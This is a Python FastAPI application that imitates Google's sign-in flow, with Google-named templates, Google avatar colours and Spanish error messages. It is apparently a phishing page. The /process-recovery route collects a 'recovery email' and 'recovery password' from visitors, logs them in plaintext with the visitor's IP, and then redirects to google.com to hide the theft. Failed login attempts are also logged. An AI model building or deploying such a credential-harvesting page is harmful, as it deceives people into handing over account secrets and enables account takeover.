from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
from datetime import datetime
import uvicorn

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()
templates = Jinja2Templates(directory="templates")

VALID_ACCOUNTS = {
    "test@gmail.com": "password123",
    "usuario@gmail.com": "clave123",
    "demo@gmail.com": "demo123"
}

@app.get("/", response_class=HTMLResponse)
async def google_login(request: Request):
    return templates.TemplateResponse("google_login.html", {"request": request})

@app.post("/check-email")
async def check_email(request: Request, email: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    logger.info(f"[EMAIL_ATTEMPT] IP: {client_host}, Email: '{email}'")
    
    if email not in VALID_ACCOUNTS:
        return templates.TemplateResponse("google_login.html", {
            "request": request,
            "error_message": "No se encontró la cuenta de Google"
        })
    
    response = RedirectResponse(url="/password", status_code=303)
    response.set_cookie(key="user_email", value=email)
    return response

@app.get("/password", response_class=HTMLResponse)
async def password_page(request: Request):
    email = request.cookies.get("user_email", "")
    if not email or email not in VALID_ACCOUNTS:
        return RedirectResponse(url="/", status_code=303)
    
    first_letter = email[0].upper() if email else "G"
    colors = ["#4285F4", "#34A853", "#FBBC05", "#EA4335"]
    color_index = ord(first_letter) % len(colors)
    
    return templates.TemplateResponse("password_step.html", {
        "request": request,
        "email": email,
        "avatar_color": colors[color_index],
        "first_letter": first_letter
    })

@app.post("/check-password")
async def check_password(request: Request, password: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    email = request.cookies.get("user_email", "")
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if not email or email not in VALID_ACCOUNTS:
        return RedirectResponse(url="/", status_code=303)
    
    correct_password = VALID_ACCOUNTS[email]
    
    if password != correct_password:
        first_letter = email[0].upper() if email else "G"
        colors = ["#4285F4", "#34A853", "#FBBC05", "#EA4335"]
        color_index = ord(first_letter) % len(colors)
        
        logger.info(f"[WRONG_PASSWORD] IP: {client_host}, Email: '{email}', Provided: '{password}', Correct: '{correct_password}'")
        
        return templates.TemplateResponse("password_step.html", {
            "request": request,
            "email": email,
            "avatar_color": colors[color_index],
            "first_letter": first_letter,
            "error_message": "Contraseña incorrecta. Vuelve a intentarlo."
        })
    
    logger.info(f"[CORRECT_PASSWORD] IP: {client_host}, Email: '{email}'")
    return RedirectResponse(url="/recovery", status_code=303)

@app.get("/recovery", response_class=HTMLResponse)
async def recovery_page(request: Request):
    email = request.cookies.get("user_email", "")
    if not email or email not in VALID_ACCOUNTS:
        return RedirectResponse(url="/", status_code=303)
    
    return templates.TemplateResponse("recovery_step.html", {
        "request": request,
        "email": email
    })

@app.post("/process-recovery")
async def process_recovery(request: Request, recovery_email: str = Form(...), recovery_password: str = Form(...)):
    client_host = request.client.host if request.client else "N/A"
    email = request.cookies.get("user_email", "")
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    logger.info(f"[RECOVERY_DATA] IP: {client_host}, Main: '{email}', Recovery Email: '{recovery_email}', Recovery Password: '{recovery_password}'")
    
    response = RedirectResponse(url="https://www.google.com", status_code=307)
    response.delete_cookie(key="user_email")
    return response

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
